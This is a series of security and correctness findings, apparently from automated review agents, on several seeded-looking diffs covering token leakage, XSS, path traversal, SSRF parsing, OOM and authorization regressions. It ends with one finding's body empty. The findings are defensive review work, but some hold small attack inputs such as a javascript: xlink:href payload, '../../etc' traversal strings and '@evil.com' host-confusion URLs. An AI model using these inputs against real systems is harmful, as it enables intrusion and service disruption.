The removed branch passed the Referer through `_scrub_uri(value, extra_param_keys)` before logging; line 5 now stores `request.headers[header]` for every header including Referer. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser attaches that token in the Referer on every subresource request. Any 5xx therefore writes a live authentication token into the log, where it is readable by anyone with log access and typically survives in aggregation systems. Restore the conditional scrub for the Referer (and keep using `extra_param_keys`) rather than logging the raw value. Note also that `extra_param_keys` appears to become unused in this function after the change, which is a signal the scrub was dropped unintentionally.

_Also raised by the security agent:_ Auth token in Referer header is written verbatim to the log

findings.title: No test guards against Referer token leakage in logs
findings.body: The removed code scrubbed the Referer header via _scrub_uri before logging, specifically to strip auth tokens (per token_authenticated_url in identity.py, tokens are passed as query params and echoed back in Referer). This diff removes that scrubbing so the raw Referer (including any token) is now logged verbatim. If there is no test asserting that a Referer containing a token/query param is scrubbed before being written to the log, this regression would silently pass all existing tests.

findings.title: xlinkhref no longer URL-validated, reintroducing javascript: XSS
findings.body:
`validateProp` previously routed `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed(value)`, which is what rejects `javascript:`, `data:text/html` and `vbscript:` (see `unsafeLinkPrefix` at the top of this file). After this change `xlinkhref` no longer matches the branch, so an `xlink:href` on an SVG element — e.g. `<svg><a xlink:href="javascript:alert(1)">` — skips scheme validation entirely and reaches the DOM. Per the file's own header comment the markdown source includes end-user-submitted content, and `validateProp` is described as the only control between that content and the DOM, so this is a directly reachable stored-XSS path. Restore `|| attribute === 'xlinkhref'` in the condition unless another validator (not visible here) covers it; if one does, this branch removal still needs a test proving it.

_Also raised by the security agent:_ xlink:href no longer scheme-checked — reintroduces SVG XSS

findings.title: No test guards xlinkhref sanitisation, so this regression is silent
findings.body: The change removes 'xlinkhref' from the attribute check that routes to isAnchorLinkAllowed, meaning xlink:href values (e.g. javascript: URIs on SVG elements) no longer get validated against unsafeLinkPrefix. Since no test file is included in this diff, there is nothing exercising validateProp with attribute === 'xlinkhref' to catch that it now falls through unchecked. If such a test existed and asserted the function still returns false/blocks unsafe xlink:href values, this change would fail it immediately.

findings.title: Unvalidated project query param reaches filesystem path construction
findings.body:
`projectQueryParameter` comes straight from the request query string and is now passed downstream with no identifier check. The file DAO's `buildPath` documents that it "does no validation of its own: callers are required to have validated the names before this point" and feeds the value directly into `filepath.Join(d.Folder, project, kind)`. With `ValidateID` gone, a value such as `../../etc` (or any name containing separators) escapes the storage root, so list operations can enumerate documents outside the intended project directory.

The remaining check on line 4 is not a substitute: it only fires when a path parameter is also present, and it merely requires the two to be equal — when only the query parameter is supplied, nothing constrains its contents. Restore the `common.ValidateID(projectQueryParameter)` call and the `HandleBadRequestError` response before the value is used.

_Also raised by the security agent:_ Path traversal: project query param no longer validated before filesystem use

findings.title: Removed validation breaks documented precondition of buildPath()
findings.body: The code removes validation of `projectQueryParameter` before it reaches `buildPath()`. However, `buildPath()` in `internal/api/database/file/file.go` has explicit documentation stating: 'It does no validation of its own: callers are required to have validated the names before this point.' By removing the `ValidateID()` check, this function now violates that documented contract, allowing unvalidated input to reach the filesystem path builder.

findings.title: No test guards the removed project-name validation
findings.body: The diff removes the common.ValidateID(projectQueryParameter) check that previously rejected invalid/malicious project names before they reach buildPath (which does no validation itself, per file.go). No test in this PR exercises list() with an invalid or path-traversal-style project query parameter (e.g. '../../etc'), so this regression would pass any existing test suite silently. A test that calls list() with such a value and asserts a bad-request error is needed to make this behavior change (or its reversal) detectable.

findings.title: Buffer pre-reserved from client-declared Content-Length (OOM)
findings.body:
`multipart.NewRW().Reserve(contentLength)` commits memory sized by a value the client declares, before a single byte of `body` has been read or validated. In the S3 UploadPart path `contentLength` comes from the request's Content-Length header (or chunked-transfer declaration), so a client can send `Content-Length: 100000000000` with an empty or trivially small body and force a huge allocation per request; a handful of concurrent requests OOM-kills the server. The previous code grew the RW incrementally as `io.Copy` consumed the body, which bounds the allocation by bytes actually delivered.

Either revert to the incremental growth, or clamp the reservation: `Reserve(min(contentLength, maxPartSize))` with a bound no larger than the S3 maximum part size (5 GiB, realistically much less), and reject requests whose declared length exceeds that bound before allocating. Also verify that `n` from `io.Copy` matches `contentLength` and fail the part if it does not.

_Also raised by the correctness agent:_ Buffer reserved from unvalidated client-declared contentLength

findings.title: No test guards against unbounded Reserve(contentLength)
findings.body: The change makes UploadPart pre-allocate a buffer sized by the caller-supplied contentLength before any bytes are read, which is exactly the memory-exhaustion pattern the surrounding comment previously guarded against. There is no test in this diff (or evidently in the existing suite, since none is touched here) that exercises a call with a large/mismatched contentLength versus actual body size to catch this regression. If this allocation strategy is wrong, nothing here would fail — a normal small-body test would pass identically whether Reserve is called with the declared length or not, since it only affects pre-allocation size, not final content correctness.

findings.title: Comment no longer describes buffer allocation strategy
findings.body: The comment previously explained that the RW buffer 'grows a page at a time as the body is read'. This is no longer true after the change — the buffer now pre-allocates based on `contentLength`. The updated comment should explain that the buffer is pre-reserved to the declared content length, so callers understand the allocation strategy and any assumptions being made.

findings.title: No handling for unknown/negative contentLength (-1) passed to Reserve
findings.body: `contentLength` is an `int64` sourced from the request; for chunked or unknown-length bodies Go conventionally yields `-1`, and a malformed header could produce another negative value. Nothing on the path guards this before it reaches `Reserve`. Depending on `Reserve`'s implementation this is either a silent no-op, a panic on a negative make/grow size, or an enormous allocation after a signed-to-unsigned conversion. Add an explicit guard (`if contentLength > 0 { rw = rw.Reserve(...) }`) so the unknown-length case falls back to incremental growth deterministically.

findings.title: Default scheme flips to plaintext http when is_secure is unset
findings.body:
The previous expression `"http" if request.meta.get("is_secure") is False else "https"` only downgraded to plaintext on an explicit `is_secure=False`; every other case (key absent, `None`, `True`) produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats a missing key and `None` as falsy, so any request that does not explicitly set `request.meta["is_secure"] = True` — the overwhelmingly common case, since no caller is required to set it — is now built as `http://{bucket}.s3.amazonaws.com{path}` on line 6 and transmitted with its AWS signature/authorization material in cleartext.

Restore the fail-secure default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or if the truthiness form is preferred, default the lookup: `request.meta.get("is_secure", True)`.

findings.title: S3 downloader defaults to plaintext HTTP, exposing signed requests
findings.body:
Previously the scheme was `https` unless the caller explicitly set `request.meta["is_secure"] = False`; i.e. transport encryption was the default and opting out was deliberate. After this change the scheme is `https` only when `is_secure` is truthy, so every request where the key is unset, `None`, or otherwise falsy is sent to `http://{bucket}.s3.amazonaws.com{path}` on line 6.

This handler serves `s3://` requests, which are signed with AWS credentials (an `Authorization: AWS ...` header or pre-signed query parameters carried in `p.query`, which is concatenated into `path` on line 5 and thus into the URL on line 6). Over plaintext HTTP a network-position attacker (shared Wi-Fi, hostile transit, malicious proxy) can read the signature and the bucket/object path, replay the signed request within its validity window, and tamper with the response body that is then fed back into the crawler as a `Response`.

Restore the fail-closed default:

```python
scheme = "http" if request.meta.get("is_secure") is False else "https"
```

so that only an explicit `is_secure=False` downgrades the connection.

findings.title: No test guards the default scheme when is_secure is absent
findings.body: The change inverts the default behavior: when request.meta lacks 'is_secure', the scheme now defaults to 'http' instead of 'https'. This is a security-relevant default (plaintext vs TLS) and no test in this diff exercises the case where 'is_secure' is unset, missing, or falsy in different ways (False vs None vs absent). If this default were wrong or accidentally reverted, nothing here would fail.

findings.title: DELETE now resolves to the "push" action, dropping the delete check
findings.body:
The previous switch had an explicit `case http.MethodDelete: action = "delete"`. After the collapse, any method that is not GET or HEAD — DELETE included — yields `action = "push"`, and that is the only action put on the `ResourceAction` passed to the authorisation check. A principal granted push on a repository will therefore pass authorisation for `DELETE /v2/<name>/manifests/<ref>` and `DELETE .../blobs/...`, permanently removing tags/blobs it was never granted delete on. The repo's own config documentation states the three actions are distinct precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones"; this change removes the only place that distinction is derived from the request. Restore an explicit branch mapping `http.MethodDelete` to `"delete"` before the general non-read fallback.

_Also raised by the security agent:_ DELETE now authorized as "push": push token can delete repository content

findings.title: No test guards DELETE-to-action mapping change
findings.body: The diff changes DELETE requests from mapping to the "delete" action to mapping to "push", per the repo context this collapses a security-relevant distinction (accounts allowed to push should not automatically be allowed to delete). No test file is part of this change, so if this mapping is wrong (as the PR title itself states it may be, being described as inverted from a prior fix), nothing in the test suite would catch it.

findings.title: Documented DELETE action is no longer mapped to any HTTP method
findings.body: The repository documentation in config.go explicitly describes three distinct actions: pull, push, and delete. The change removes the mapping of http.MethodDelete to the 'delete' action, collapsing it to only two actions (pull and push). This contradicts the documented API contract that states 'The three actions are distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' Callers relying on the delete action for authorization control will find it no longer works.

findings.title: Default for unrecognised methods silently changed from "pull" to "push"
findings.body: The old switch had an explicit `default: action = "pull"` for methods outside the HEAD/GET/POST/PATCH/PUT/DELETE set (e.g. OPTIONS, or anything the router forwards). The new condition treats every such method as "push", so requests that previously only required pull rights now require push. This direction is fail-closed rather than fail-open, but it is an unannounced behaviour change for any caller relying on the documented default, and it is worth making explicit rather than incidental.

findings.title: get_tenant_fresh name misleads about mutation
findings.body:
The function `get_tenant_fresh` uses the `get_*` naming convention, which signals a read-only lookup operation to callers. However, it mutates the cache (line 10: `_CACHE[tenant_id] = tenant`) and even clears it (line 12: `_CACHE.clear()`). A caller expecting read-only semantics from a `get_*` function will be surprised by these side effects. Either rename to reflect mutation (e.g., `fetch_and_cache_tenant`, `load_tenant_fresh`) or add explicit documentation.

_Also raised by the correctness agent:_ Overflow path clears the entry it just cached

_Also raised by the correctness agent:_ A None result from _fetch is cached and indistinguishable from a miss

findings.title: New mutating cache function has no test coverage
findings.body: get_tenant_fresh fetches, writes into _CACHE, and applies an eviction rule (clear the entire cache once it exceeds 1000 entries) — a behavior change with real correctness implications (e.g. clearing the whole cache instead of evicting one entry, off-by-one on the threshold, or _fetch failing and leaving a stale entry). No test file is included in this diff, so none of these behaviors are verified; a bug in the eviction logic or the write-through caching would pass silently.

findings.title: Caller-supplied tenant_id can thrash the shared cache for all tenants
findings.body:
`get_tenant_fresh` unconditionally inserts `tenant_id` into the module-level `_CACHE` (line 10) and, when the map exceeds 1000 entries, calls `_CACHE.clear()` (lines 11-12), discarding every other tenant's entry rather than evicting one. If `tenant_id` is reachable from a request parameter, a caller can enumerate ~1001 arbitrary ids to (a) force an uncached `_fetch` per request against the backing store and (b) repeatedly flush the cache, so every other tenant's subsequent `get_tenant` on line 5 misses too. That turns a small number of cheap requests into sustained load on the origin datastore and degrades all tenants.

Two cheap mitigations: validate/authorise `tenant_id` before it is used as a cache key so unknown ids are never inserted, and replace the wholesale `clear()` with bounded eviction (e.g. `collections.OrderedDict` + `popitem(last=False)`, or `functools.lru_cache`-style LRU) so one caller cannot evict everyone.

findings.title: README documents renamed flag with old name
findings.body:
The README documents `--workers` as a CLI flag, but the code has renamed it to `--concurrency`. Users following the README will use the wrong flag name and encounter an error. Update line 7 to reference `--concurrency` instead.

_Also raised by the correctness agent:_ README still documents the removed --workers flag

findings.title: Renaming --workers also renames args.workers, breaking callers
findings.body: `p.add_argument("--concurrency", ...)` changes the argparse destination from `args.workers` to `args.concurrency`. Any code that reads `args.workers` after parsing will now raise `AttributeError` at runtime rather than failing at import, and any existing invocation or script passing `--workers` will exit with "unrecognized arguments". No caller was shown in the retrieved context, so I cannot confirm the internal consumers were updated — please grep for `\.workers` and for `--workers` in scripts/CI. If the old spelling must keep working, either add `dest="workers"` to preserve the attribute, or register `"--workers"` as a deprecated alias on the same argument.

findings.title: Docstring contradicts implementation return type
findings.body: The docstring states the function returns 'the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping day to count. A caller relying on the documented contract will receive a different data structure and their code will break. Update the docstring to reflect the new return format.

findings.title: Return shape changed from int to dict, breaking existing callers
findings.body:
`monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. Any caller doing arithmetic, comparison against a quota, or formatting (`f"{monthly_usage(a)} calls"`) will now silently produce wrong output or raise `TypeError`. The docstring on line 2 still advertises the old contract, so callers reading it will be misled.

Either keep the scalar and add a new function (e.g. `daily_usage`) for the breakdown, or update the name, docstring, and every call site together. No caller code was retrieved for this review, so the blast radius needs to be confirmed by grepping for `monthly_usage`.

findings.title: No test covers the new dict-shaped return value of monthly_usage
findings.body: monthly_usage now returns a dict mapping day to count instead of a single integer total, but no test in this diff exercises this. If the GROUP BY query, key names ('day'/'count'), or dict comprehension were wrong (e.g. off-by-one grouping, wrong column alias), nothing would fail.

findings.title: Docstring parameter name does not match function signature
findings.body: The docstring on line 6 documents the parameter as `page_size`, but the function signature on line 1 has renamed it to `limit`. A caller reading the docstring will use the wrong parameter name, causing a runtime error. Update the docstring to match the new parameter name.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body: `list_invoices` is a module-level (apparently public) function and its second parameter changed name from `page_size` to `limit`. Positional callers are unaffected, but any caller doing `list_invoices(tid, page_size=100)` — the natural call style for an optional pagination argument — will now raise `TypeError: list_invoices() got an unexpected keyword argument 'page_size'`. If this function is used outside this module, either accept both names for a deprecation period (e.g. `def list_invoices(tenant_id, limit=50, cursor=None, page_size=None)` mapping the legacy name onto `limit` with a warning) or update every call site in the same change. No call sites were retrieved here, so please confirm none pass the argument by keyword.

findings.title: Absolute `from adapters import HTTPAdapter` will fail on import
findings.body: Every other intra-package import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...`). `from adapters import HTTPAdapter` resolves against `sys.path`, not the `requests` package, so on Python 3 (and on Python 2 with `absolute_import`) importing `requests.sessions` — and therefore `requests` — raises `ImportError`. It only appears to work when the interpreter's CWD happens to be the package directory. Change it to `from .adapters import HTTPAdapter`.

findings.title: verify/cert accepted by request() but never applied to the send path
findings.body: The new `request()` signature still advertises `verify=None` and `cert=None` (lines 148-149), but the body never reads them: it only copies method/url/headers/files/data/params/auth/cookies/allow_redirects/proxies/hooks onto the `Request`, calls `req.prepare()`, and returns `self.send(prep)`. `send()` (lines 364-367) constructs `HTTPAdapter()` with no configuration and calls `adapter.send(request)` with no verification arguments. Consequently a caller doing `session.request(..., verify='/path/to/corp-ca.pem')` or `cert=('client.pem','key.pem')` gets a connection that ignores both: the custom CA bundle / pinned trust store is not used and the client certificate is not presented. The old path (`old_request`, still present) threaded these through. Thread `verify` and `cert` (falling back to the session/config defaults) into the prepared request or into `send()`/the adapter before this replaces `old_request`; silently dropping a TLS trust setting that the caller explicitly passed is worse than raising.

findings.title: New `request()` silently discards timeout, verify, cert, prefetch and session defaults
findings.body: The rewritten `request()` still accepts `timeout`, `allow_redirects` semantics, `proxies`, `return_response`, `config`, `prefetch`, `verify` and `cert`, but only copies method/url/headers/files/data/params/auth/cookies/allow_redirects/proxies/hooks onto the `Request` and then calls `self.send(prep)`. `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are accepted and thrown away — callers passing `timeout=5` or `verify=False` get no error and no effect, which is worse than a `TypeError`. It also no longer merges the session-level `headers`, `params`, `auth`, `cookies` and `hooks` that `old_request` merged, so configuration set on the `Session` object is ignored. Additionally `return_response=False` previously returned the request rather than the response; the new path always returns the response.

findings.title: `_send_request` deleted but `old_request` still calls it
findings.body: The `_send_request` helper is removed in this hunk, yet the surviving `old_request` body still ends with `return self._send_request(r, **args)` on line 292. Any call that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep the helper for as long as `old_request` exists, or delete `old_request` in the same change.

findings.title: `close()` is now a no-op and `self.poolmanager` no longer exists
findings.body: `init_poolmanager()` and its call from `__init__` are removed, so `self.poolmanager` is never set, and `close()` — which used to call `self.poolmanager.clear()` — now does nothing. Two consequences: (1) `with Session() as s:` / `s.close()` no longer releases pooled sockets, so connections leak for the lifetime of the process; (2) any code (including user code and the adapter refactor) that reads `session.poolmanager` or calls `session.init_poolmanager()` now raises `AttributeError`. The `pool_connections` / `pool_maxsize` / `support_http0.9` config keys also become silently inert. If pooling is moving to `HTTPAdapter`, `close()` should delegate to the adapter rather than being stubbed out.

findings.title: Unqualified `from adapters import HTTPAdapter` allows module shadowing
findings.body: Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` is absolute: on Python 3 it resolves against `sys.path`, so whatever top-level module named `adapters` is found first wins — including a file dropped in the interpreter's working directory or in any user-writable path entry. Because this executes at import time of `requests.sessions`, a shadowing module runs arbitrary code in the process and can additionally substitute the `HTTPAdapter` that performs every outbound TLS request. Change it to `from .adapters import HTTPAdapter`.

findings.title: New adapter-based send() path has no visible test coverage
findings.body: Session.send() previously called request.send() directly; it now constructs an HTTPAdapter and delegates to adapter.send(request). This is a core behavioral change to how every request is dispatched, but no test in this diff (or referenced) exercises the new adapter path, verifies HTTPAdapter is invoked correctly, or checks that the returned response is passed through unchanged. If HTTPAdapter.send() has a different signature, return type, or error behavior than the old request.send(), nothing here would catch it.

findings.title: Public method close() lost its docstring
findings.body: The `close()` method is public (callable by users of the Session class) but its docstring was deleted. The method now contains only `pass`, which may confuse callers about whether it still does anything. If this is intentional refactoring, the docstring should be updated to reflect the new behavior; if `close()` now delegates to adapters, that contract should be documented.

findings.title: send() docstring incomplete after refactor
findings.body: The `send()` method's docstring says 'Send a given PreparedRequest' but now creates an HTTPAdapter and delegates to it. The docstring does not mention this adapter pattern or any behavior changes from the old direct `request.send()` call. Callers should understand the new flow.

findings.title: cookies property returns None on parse failure, breaking all callers
findings.body:
On a malformed `Cookie:` header the except branch sets `self._cookies = None` and returns it. Because `_cookies` is then set, the `hasattr` guard short-circuits on every subsequent access, so the request permanently yields `None` instead of a mapping.

The old implementation in `web.py` never exposed `None` — it called `self.clear_all_cookies()` and still returned a (SimpleCookie) mapping. Callers still rely on that contract:

- `RequestHandler.get_cookie` (web.py:321) does `if name in self.request.cookies:` → `TypeError: argument of type 'NoneType' is not iterable`.
- `RequestHandler.clear_all_cookies` (web.py:367) does `self.request.cookies.iterkeys()` → `AttributeError: 'NoneType' object has no attribute 'iterkeys'`.
- Anything layered on `get_cookie` (e.g. `get_secure_cookie`, XSRF handling) inherits the same failure.

The result is that a client-supplied bad cookie header turns into a 500 rather than "no cookies". Set the fallback to an empty mapping instead, e.g. `self._cookies = {}` (or a fresh `Cookie.SimpleCookie()`), so the property always returns a dict-like object.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing callers

findings.title: No test covers the changed exception-handling behavior for cookie parsing
findings.body: The moved `cookies` property changes what happens when `Cookie.load()` raises: previously (in web.py) the handler called `self.clear_all_cookies()`, which iterates over the cookie dict; now it just sets `self._cookies = None`. Any caller that still treats `cookies` as a dict-like object after a parse failure (e.g. `self.request.cookies.iterkeys()` in `web.py`'s `clear_all_cookies`) will raise AttributeError on `None`. No test in the diff exercises malformed/invalid Cookie headers, so this regression would not be caught by CI.

findings.title: Incomplete docstring for HTTPRequest.cookies property
findings.body: The docstring states "A dictionary of Cookie.Morsel objects" but does not document that the property can return `None` if cookie parsing fails (line 523). Callers relying on this documentation may not expect None and could encounter AttributeError when trying to iterate or access the result. This is a behavioral change from the original RequestHandler.cookies implementation, which called `self.clear_all_cookies()` on parse failure instead of returning None.

findings.title: Parameter key not stripped: `boundary` never matches after `; `
findings.body:
`content_type.split(";")` keeps the leading space that HTTP clients put after the semicolon, so for the standard header `multipart/form-data; boundary=----WebKitFormBoundaryXyz` the second element is `" boundary=----WebKitFormBoundaryXyz"` and `partition("=")` yields `k == " boundary"`. The test `k == "boundary"` therefore fails, `_parse_mime_body` is never called, the `for`/`else` branch logs "Invalid multipart/form-data", and the request is dispatched with empty `arguments`/`files` — i.e. every multipart POST silently loses its data. The previous code used the substring test `'boundary=' in content_type`, which was whitespace-insensitive, so this is a regression introduced by the change.

Fix by normalising each field before partitioning, e.g. `k, sep, v = field.strip().partition("=")`. While there, consider stripping surrounding quotes from `v` (`boundary="..."` is legal per RFC 2046) and comparing the key case-insensitively.

findings.title: Content-Type parameters not stripped; conforming multipart bodies dropped
findings.body:
Entry point is the attacker/client-supplied `Content-Type` request header; sink is `self._parse_mime_body(v, data)`. `content_type.split(";")` yields parameters with the leading space that RFC 7231 permits and that virtually every HTTP client emits, so for the normal header `multipart/form-data; boundary=----abc` the loop sees `k == " boundary"` and never matches. The `for`/`else` then fires and the request is logged as "Invalid multipart/form-data" with `self._request.arguments`/`files` left empty, while the handler is still invoked via `self.request_callback(self._request)`.

Two consequences worth separating:
- Availability/correctness: all standards-conforming multipart uploads stop being parsed.
- Parser differential: only a non-conforming header with no space (`multipart/form-data;boundary=x`) is parsed by Tornado. A fronting proxy, WAF or upload scanner that parses the parameter correctly will see and inspect a different set of parts than Tornado does, and handlers that make decisions on "no arguments present" now silently take the empty-input branch instead of erroring.

Fix: normalise each parameter before comparing, e.g. `k, sep, v = field.strip().partition("=")`, lowercase `k` for the case-insensitive parameter name, and strip surrounding double quotes from `v` (`boundary="----abc"` is legal and is currently passed to `_parse_mime_body` with the quotes attached, which will also fail to match part delimiters).

findings.title: No test covers the new Content-Type boundary-parsing logic
findings.body: The diff replaces a substring-based boundary extraction with a field-splitting loop (split by ';', then partition on '='), and moves the 'else: logging.warning' from being paired with the 'if boundary in content_type' check to being paired with the 'for' loop (a for/else construct). Neither the original nor the new logic is exercised by any visible test. In particular, edge cases like a Content-Type header of 'multipart/form-data; boundary=xyz' (with a space after the semicolon, which is common) would yield a key of ' boundary' (with leading space) that fails the 'k == "boundary"' comparison — silently falling through to the warning branch and dropping the multipart body. No test exists to catch this class of regression.

findings.title: Error message has unmatched format placeholder
findings.body: The error message on line 100 contains a '%s' format placeholder but passes no argument to the exception constructor. This will either cause a TypeError at runtime (if the exception tries to format the string), or the literal string "Failed to parse: %s" will be shown to users instead of the actual URL that failed to parse. The error message should include the url parameter in the string formatting.

findings.title: get_host() ignores query/fragment, allowing host-parsing mismatch (SSRF)
findings.body:
`get_host()` removes a scheme prefix and then only a `/`-delimited path before searching for `@`. Query strings and fragments are never separated, so everything up to the first `@` is discarded as userinfo:

- `get_host('http://good.com?x=@evil.com')` → `('http', 'evil.com', None)`
- `get_host('http://good.com#@evil.com')` → `('http', 'evil.com', None)`

while `urllib.parse.urlsplit(...).hostname` reports `good.com` for both. Any caller that validates a user-supplied URL against a host allowlist with the stdlib parser and then hands the same string to urllib3 (`connection_from_url`, `PoolManager.urlopen`) will connect to the attacker's host — a classic parser-differential SSRF / allowlist bypass. The same leniency means IPv6 literals (`http://[::1]:8080/`) fall into the `:` branch and raise `LocationParseError`.

Since this module is being created as the canonical URL helper, it is worth terminating the authority at the first of `/`, `?` or `#` (or delegating to `urlsplit`) rather than only `/`.

I cannot see the entry point in this diff — whether a fully attacker-controlled URL reaches `get_host()` depends on `connectionpool.py`/`poolmanager.py`, which were not retrieved — so this is rated on the discrepancy itself rather than a demonstrated path.

findings.title: LocationParseError message has an uninterpolated %s placeholder
findings.body:
`raise LocationParseError("Failed to parse: %s")` never substitutes anything, so callers and logs see the literal string `Failed to parse: %s` and the malformed URL/port is lost — exactly the information needed to debug a parse failure. It should be `raise LocationParseError("Failed to parse: %s" % url)` (or include the original url before the splits mutated it, since `url` has already been stripped of scheme, path and auth by this point — capturing the original argument would be more useful).

_Also raised by the security agent:_ LocationParseError message has an unfilled %s placeholder

findings.title: New util.py has no tests exercising its logic paths
findings.body: This 125-line module introduces make_headers, get_host, and is_connection_dropped with no accompanying test file in the diff. In particular, the invalid-port branch in get_host (line 99-100) that raises LocationParseError is not exercised by anything, so the malformed format string ('Failed to parse: %s' with no %-argument, which would raise at raise-time or silently print a literal '%s') would go unnoticed. Add a test that passes a URL with a non-numeric port and asserts on the exception message.

findings.title: HTTPMove.location changes type from str to URL, breaking callers
findings.body:
`self.location` is now assigned `URL(location)` instead of the string that was passed in. The documented contract for this public attribute (docs/web_reference.rst) states it is "the location the response redirects to, **as the string it was constructed with**", and that application code compares it against configured strings and passes it to `str.startswith`. A `yarl.URL` has no `startswith`, so any such caller raises `AttributeError`, and equality comparisons against plain strings silently become `False`. Additionally `URL(location)` normalises the input, so even `str(self.location)` may not round-trip the original value (e.g. percent-encoding or trailing-slash handling).

If the goal was only to avoid constructing the URL twice, keep the public attribute as the original string and use a local: `url = URL(location); self.location = location; self.headers['Location'] = str(url)`.

_Also raised by the security agent:_ location changes from str to URL, silently breaking string redirect checks

findings.title: Public attribute type changed; documentation contradicts implementation
findings.body: The `location` attribute on `HTTPMove` now stores a `URL` object (line 8), but the docstring in `docs/web_reference.rst` states it is 'the string it was constructed with'. This is now false. Code that relied on the documented contract—calling `str.startswith()` on it directly, or comparing it against configured strings—will break. The docstring must be updated to reflect that `location` is now a `URL` object, or its type must be reverted.

findings.title: No test guards HTTPMove.location's documented string type
findings.body: `self.location` is now assigned `URL(location)` instead of the original string, contradicting docs/web_reference.rst which states the attribute is 'the string it was constructed with' and that application code calls `str.startswith` on it. This diff includes no test file, so nothing exercises `HTTPMove.location`'s type/value after construction. A test asserting `isinstance(exc.location, str)` and `exc.location == given_location` (or equivalent behavior like `startswith`) would have caught this regression; without it, the type inversion can ship silently.

findings.title: readany can return empty bytes spuriously after a single wait
findings.body:
`_wait` documents that the waiter is also resolved at the end of a chunk, which can occur with no new data in the buffer, so the caller "must re-check its condition after waking rather than assuming data arrived". Replacing the `while` with an `if` removes exactly that re-check: after a spurious wake, `self._buffer` is still empty and `self._eof` is still False, yet control falls through to `self._read_nowait(-1)` which returns `b''`. Since `b''` is the EOF sentinel for `readany()` consumers (`while True: chunk = await resp.content.readany(); if not chunk: break`), a spurious wake truncates the stream and the remaining body is silently dropped. Restore the loop so the buffer/eof condition is re-evaluated after every wake.

_Also raised by the security agent:_ readany() may return b"" early, which consumers read as EOF (truncated body)

findings.title: No test guards the re-check-after-wake behavior for readany()
findings.body: The change replaces `while not self._buffer and not self._eof` with a single `if`, removing the re-check loop that was presumably added specifically to handle the case where `_wait` resolves without new data in the buffer (as documented in the docstring for `_wait`: 'the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer'). This PR includes no test exercising that scenario, so a regression that causes `readany()` to return empty bytes prematurely would not be caught by any existing or new test.

findings.title: Implicit relative import breaks package import on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328 / absolute imports by default), so on any Python 3 interpreter this line raises `ModuleNotFoundError: No module named 'adapters'` the moment `requests.sessions` is imported — which is effectively the moment anyone imports `requests`. Even on Python 2 it is fragile: if a top-level module or installed distribution named `adapters` exists on `sys.path`, it can shadow the intended `requests.adapters`. Restore the explicit form: `from .adapters import HTTPAdapter`.

findings.title: Import moved off package namespace to sys.path, enabling module shadowing
findings.body:
`from .adapters import HTTPAdapter` resolved unambiguously to `requests/adapters.py`. `from adapters import HTTPAdapter` resolves through `sys.path` instead (in Python 3 it is a plain absolute import; in Python 2 it falls back to implicit relative only after the package directory is consulted). Any writable directory earlier on `sys.path` — the invoking script's directory, an empty `''` entry when embedding/`python -c`, a user-site or a world-writable deployment dir — lets an unprivileged local actor drop an `adapters.py` whose module body executes inside every process that imports `requests`, and whose `HTTPAdapter` then mediates all outbound TLS (certificate verification, proxies, connection pooling). That is arbitrary code execution plus full control of the HTTP transport for the importing application.

Restore the explicit relative form (`from .adapters import HTTPAdapter`) or the fully qualified `from requests.adapters import HTTPAdapter` so resolution cannot be redirected by `sys.path` contents.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body: `self.request.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see `tornado/httpserver.py`, which returns `None` explicitly and states "every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable` instead of returning `default`. Any client can trigger this by sending a malformed Cookie header, turning a handled case into a 500 on every handler that calls `get_cookie` (including `get_secure_cookie`/XSRF paths that build on it). Restore the check: `if self.request.cookies is not None and name in self.request.cookies:`.

findings.title: Malformed Cookie header causes TypeError in get_cookie
findings.body:
`self.request.cookies` is documented (tornado/httpserver.py) to return `None` when the Cookie header is present but cannot be parsed. Removing the `is not None` check makes `name in self.request.cookies` evaluate `in` against `None`, raising `TypeError: argument of type 'NoneType' is not iterable`.

Entry point: the `Cookie:` request header, fully attacker-controlled and unauthenticated. Sink: the membership test on line 3, reached by every handler that calls `get_cookie` (and transitively `get_secure_cookie`, XSRF cookie handling, and session lookups). A single crafted header turns any such request into an unhandled 500, and it costs the attacker nothing to repeat, so it is a cheap remote availability/error-path issue rather than a purely theoretical one.

Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:` — or, better, have `cookies` return an empty dict on parse failure so no consumer has to remember.

findings.title: No test covers get_cookie with unparsable Cookie header
findings.body: The removed None-check guarded against request.cookies being None, which per httpserver.py's cookies property happens when the Cookie header is present but unparsable. This diff reintroduces a TypeError ('argument of type NoneType is not iterable') in that case. No test in this change exercises get_cookie with a malformed Cookie header, so this regression would not be caught by the existing test suite.

findings.title: Dropping .strip() breaks multipart boundary detection
findings.body: `content_type.split(";")` leaves the whitespace that conventionally follows the separator in a Content-Type header, e.g. `"multipart/form-data; boundary=----abc"` yields the fragment `" boundary=----abc"`. Partitioning that fragment without stripping gives `k == " boundary"`, so the comparison `k == "boundary"` on line 5 is false and `self._parse_mime_body` on line 6 is never reached. The loop then falls through with no error, so multipart/form-data request bodies are silently dropped: `arguments`/`files` stay empty for every well-formed client request. Restore `field.strip().partition("=")` (or strip `k` before comparing).

findings.title: Dropping .strip() makes multipart boundary parsing fail open on normal headers
findings.body:
